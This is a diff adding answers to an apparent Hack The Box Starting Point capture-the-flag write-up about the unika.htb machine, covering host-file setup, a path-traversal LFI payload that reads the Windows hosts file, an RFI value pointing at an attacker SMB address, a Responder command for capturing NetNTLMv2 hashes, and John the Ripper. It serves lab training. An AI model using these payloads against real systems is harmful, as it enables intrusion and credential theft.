@@ -293,36 +293,119 @@ We successfull access `admin` dashboard
 
 When visiting the web service using the IP address, what is the domain that we are being redirected to?
 
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_1.png?raw=true" alt="image">
+</div>
+
+When visiting the web service using ip address, we see that it domain is `unika.htb`
+And the errpr is `DNS_PROBE_POSSIBLE` means that the resolver was unable to find DNS records for the requested hostname. In order to view the page we have to edit the `hosts` file on local machine to resolve the domain.
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_1_2.png?raw=true" alt="image">
+</div>
+
+Successfully accessed the webpage
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_1_3.png?raw=true" alt="image">
+</div>
+
+    A: unika.htb
+
 ### Task 2
 
 Which scripting language is being used on the server to generate webpages?
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_2.png?raw=true" alt="image">
+</div>
+
+We can see that the scripting language for the server is `php` version `8.1.1`. And target machine OS is Windows x64
+
+    A: php
 
 ### Task 3
 
 What is the name of the URL parameter which is used to load different language versions of the webpage?
 
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_3.png?raw=true" alt="image">
+</div>
+
+Attemp to change to another language we see the `page=german.html` parameter
+
+    A: page
+
 ### Task 4
 
 Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
+
+Base on this: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+
+We try `page=../../../../../../../../windows/system32/drivers/etc/hosts`
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_4.png?raw=true" alt="image">
+</div>
+
+As we see, we can access the hosts file from the target machine 
+
+    A: ../../../../../../../../windows/system32/drivers/etc/hosts
 
 ### Task 5
 
 Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
 
+Base on this: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion
+
+We try `//10.10.14.6/somefile`
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_5.png?raw=true" alt="image">
+</div>
+
+We see that it do attempt to open the file `somefile`
+
+    A: //10.10.14.6/somefile
+
 ### Task 6
 
 What does NTLM stand for?
+
+    A: New Technology LAN Manager
+
+Which comprises a group of security protocols designed for Microsoft Windows. It employs a challenge-response mechanism to authenticate clients and servers. However, Microsoft advises against using NTLM for contemporary applications because of its insufficient encryption.
 
 ### Task 7
 
 Which flag do we use in the Responder utility to specify the network interface?
 
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_7.png?raw=true" alt="image">
+</div>
+
+    A: -I
+
+Use: `ip a` to see the interface connect to Starting point
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_2.png?raw=true" alt="image">
+</div>
+
+My interface is `eth0`
+
+
+Using responder run this cmd `responder -i {target ip} -I {interface to startingpoint} -d -w
 
 ### Task 8
 
 There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
 
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_8.png?raw=true" alt="image">
+</div>
 
+    A: john the ripper
 
 ### Task 9
 
